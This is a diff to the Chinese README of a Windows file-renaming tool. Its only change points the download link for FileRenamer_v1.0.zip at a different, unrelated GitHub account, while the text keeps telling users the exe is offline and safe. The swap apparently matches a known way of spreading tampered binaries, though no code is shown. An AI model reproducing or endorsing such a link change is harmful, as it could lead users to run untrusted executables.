@@ -3,7 +3,7 @@
 > 把几百个乱名字的文件按规则一次性改整齐；把散落各处的照片、合同、扫描件按年月自动归位。
 > 改之前能预览，改错了能一键撤销，**不删任何文件**。
 
-**[⬇ 下载 FileRenamer v1.0.0（Windows，免安装）](https://github.com/Camellius-lan/file-renamer/releases/download/v1.0.0/FileRenamer_v1.0.zip)**
+**[⬇ 下载 FileRenamer v1.0.0（Windows，免安装）](https://github.com/Convallaria-majalis1/file-renamer/releases/download/v1.0.0/FileRenamer_v1.0.zip)**
 
 > 下载后解压，双击 `FileRenamer.exe` 即可。不需要装 Python，不联网，文件不会离开你的电脑。
 
